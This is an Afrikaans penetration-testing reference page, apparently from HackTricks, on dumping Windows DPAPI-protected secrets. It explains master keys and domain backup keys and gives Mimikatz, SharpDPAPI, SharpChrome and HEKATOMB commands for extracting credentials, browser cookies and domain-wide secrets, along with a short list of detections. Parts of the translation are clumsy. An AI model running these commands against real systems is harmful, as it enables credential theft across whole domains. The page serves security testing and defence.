# DPAPI - Uittreksel van Wagwoorde

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simmetriese versleuteling van asimmetriese privaat sleutels**, wat óf gebruikers- óf stelselsêls as 'n belangrike bron van entropie benut. Hierdie benadering vereenvoudig versleuteling vir ontwikkelaars deur hulle in staat te stel om data te versleutel met 'n sleutel wat afgelei is van die gebruiker se aanmeldsêls of, vir stelselsversleuteling, die stelsel se domeinverifikasiesêls, wat die behoefte aan ontwikkelaars om die beskerming van die versleuteling sleutel self te bestuur, uitskakel.

Die mees algemene manier om DPAPI te gebruik, is deur die **`CryptProtectData` en `CryptUnprotectData`** funksies, wat toepassings toelaat om data veilig te versleutel en te ontsleutel met die sessie van die proses wat tans aangemeld is. Dit beteken dat die versleutelde data slegs deur dieselfde gebruiker of stelsel wat dit versleutel, ontsleuteld kan word.

Boonop aanvaar hierdie funksies ook 'n **`entropy` parameter** wat ook tydens versleuteling en ontsleuteling gebruik sal word, daarom, om iets te ontsleutel wat met hierdie parameter versleuteld is, moet jy dieselfde entropiewaarde verskaf wat tydens versleuteling gebruik is.

### Gebruikers sleutelgenerasie

Die DPAPI genereer 'n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hul geloofsbriewe. Hierdie sleutel is afgelei van die gebruiker se wagwoord en ander faktore en die algoritme hang af van die tipe gebruiker, maar eindig as 'n SHA1. Byvoorbeeld, vir domein gebruikers, **hang dit af van die HTLM-hash van die gebruiker**.

Dit is veral interessant omdat as 'n aanvaller die gebruiker se wagwoordhash kan verkry, hulle kan:

- **Enige data ontsleutel wat met DPAPI versleutel is** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer om die **wagwoord te kraak** aflyn deur te probeer om die geldige DPAPI-sleutel te genereer

Boonop, elke keer as 'n gebruiker data met DPAPI versleutel, word 'n nuwe **master sleutel** gegenereer. Hierdie master sleutel is die een wat werklik gebruik word om data te versleutel. Elke master sleutel word gegee met 'n **GUID** (Globally Unique Identifier) wat dit identifiseer.

Die master sleutels word gestoor in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gids, waar `{SID}` die Veiligheidsidentifiseerder van daardie gebruiker is. Die master sleutel word versleuteld gestoor deur die gebruiker se **`pre-key`** en ook deur 'n **domein rugsteun sleutel** vir herstel (so die dieselfde sleutel word 2 keer versleuteld gestoor deur 2 verskillende wagwoorde).

Let daarop dat die **domeinsleutel wat gebruik word om die master sleutel te versleutel in die domeinbeheerders is en nooit verander nie**, so as 'n aanvaller toegang tot die domeinbeheerder het, kan hulle die domein rugsteun sleutel verkry en die master sleutels van alle gebruikers in die domein ontsleutel.

Die versleutelde blobs bevat die **GUID van die master sleutel** wat gebruik is om die data binne sy koppe te versleutel.

> [!NOTE]
> DPAPI versleutelde blobs begin met **`01 00 00 00`**

Vind master sleutels:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe 'n klomp Meester Sleutels van 'n gebruiker sal lyk:

![](<../../images/image (1121).png>)

### Masjien/Sisteem sleutel generasie

Dit is die sleutel wat vir die masjien gebruik word om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA geheim**, wat 'n spesiale sleutel is waartoe slegs die SYSTEM gebruiker toegang kan hê. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self toeganklik moet wees, soos masjienvlak geloofsbriewe of stelselswye geheime.

Let daarop dat hierdie sleutels **nie 'n domein rugsteun het** nie, so hulle is slegs lokaal toeganklik:

- **Mimikatz** kan dit toegang verkry deur LSA geheime te dump met die opdrag: `mimikatz lsadump::secrets`
- Die geheim word binne die register gestoor, so 'n administrateur kan **die DACL toestemmings wysig om toegang te verkry**. Die registerpad is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Gedeelte Data deur DPAPI

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows geloofsbriewe
- Internet Explorer en Google Chrome se wagwoorde en outo-voltooi data
- E-pos en interne FTP rekening wagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke, en Windows Vault, insluitend enkripteersleutels
- Wagwoorde vir afstandskantoor verbindings, .NET Passport, en private sleutels vir verskeie enkripteer- en verifikasiedoele
- Netwerk wagwoorde bestuur deur Credential Manager en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger, en meer
- Enkripteerde blobs binne die register
- ...

Stelsel beskermde data sluit in:
- Wifi wagwoorde
- Geplande taak wagwoorde
- ...

### Meester sleutel ekstraksie opsies

- As die gebruiker domein administrateur regte het, kan hulle toegang verkry tot die **domein rugsteun sleutel** om alle gebruiker meester sleutels in die domein te dekripteer:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met plaaslike admin regte is dit moontlik om **toegang te verkry tot die LSASS geheue** om die DPAPI meester sleutels van al die gekonnekteerde gebruikers en die SYSTEM sleutel te onttrek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike adminregte het, kan hulle die **DPAPI_SYSTEM LSA geheim** toegang verkry om die masjien meester sleutels te ontsleutel:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die wagwoord of hash NTLM van die gebruiker bekend is, kan jy **die meester sleutels van die gebruiker direk ontsleutel**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne 'n sessie as die gebruiker is, is dit moontlik om die DC te vra vir die **rugsteun sleutel om die meester sleutels te ontsleutel met RPC**. As jy plaaslike admin is en die gebruiker is ingelog, kan jy **sy sessie token steel** hiervoor:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Kluis
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI Gekodeerde Data

### Vind DPAPI Gekodeerde data

Gewone gebruikers **lêers beskerm** is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kontroleer ook deur `\Roaming\` te verander na `\Local\` in die bogenoemde paaie.

Enumerasie voorbeelde:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-geënkripteerde blobs in die lêerstelsel, register en B64-blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let wel dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (uit dieselfde repo) gebruik kan word om sensitiewe data soos koekies met DPAPI te ontsleutel.

### Toegang sleutels en data

- **Gebruik SharpDPAPI** om akrediteerbesonderhede uit DPAPI-gesleutelde lêers van die huidige sessie te verkry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry geloofsbriewe inligting** soos die versleutelde data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot meester sleutels**:

Delekteer 'n meester sleutel van 'n gebruiker wat die **domein rugsteun sleutel** aanvra deur RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI** hulpmiddel ondersteun ook hierdie argumente vir meester sleutel ontsleuteling (let op hoe dit moontlik is om `/rpc` te gebruik om die domein se rugsteun sleutel te kry, `/password` om 'n platte teks wagwoord te gebruik, of `/pvk` om 'n DPAPI domein private sleutel lêer te spesifiseer...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Deur 'n meester sleutel data ontsleutel**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI** hulpmiddel ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps` ontsleuteling (let op hoe dit moontlik is om `/rpc` te gebruik om die domeine rugsteun sleutel te kry, `/password` om 'n platte wagwoord te gebruik, `/pvk` om 'n DPAPI domein private sleutel lêer te spesifiseer, `/unprotect` om die huidige gebruikersessie te gebruik...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Ontsleutel sommige data met behulp van **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Toegang tot ander masjien se data

In **SharpDPAPI en SharpChrome** kan jy die **`/server:HOST`** opsie aandui om toegang te verkry tot 'n afstandmasjien se data. Natuurlik moet jy in staat wees om daardie masjien te benader en in die volgende voorbeeld word veronderstel dat die **domein rugsteun versleuteling sleutel bekend is**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander gereedskap

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n hulpmiddel wat die onttrekking van alle gebruikers en rekenaars uit die LDAP-gids outomatiseer en die onttrekking van die domeinbeheerder se rugsteun sleutel deur RPC. Die skrip sal dan alle rekenaars se IP-adresse oplos en 'n smbclient op alle rekenaars uitvoer om alle DPAPI blobs van alle gebruikers te verkry en alles met die domein rugsteun sleutel te ontsleutel.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die onttrekking van die LDAP-rekenaarslys kan jy elke subnet vind selfs al het jy nie daarvan geweet nie!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheime wat deur DPAPI beskerm word outomaties dump.

### Algemene opsporings

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante gidse.
- Spesifiek vanaf 'n netwerkdeel soos C$ of ADMIN$.
- Gebruik van Mimikatz om LSASS-geheue te benader.
- Gebeurtenis **4662**: 'n operasie is op 'n objek uitgevoer.
- Hierdie gebeurtenis kan nagegaan word om te sien of die `BCKUPKEY` objek benader is.

## Verwysings

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
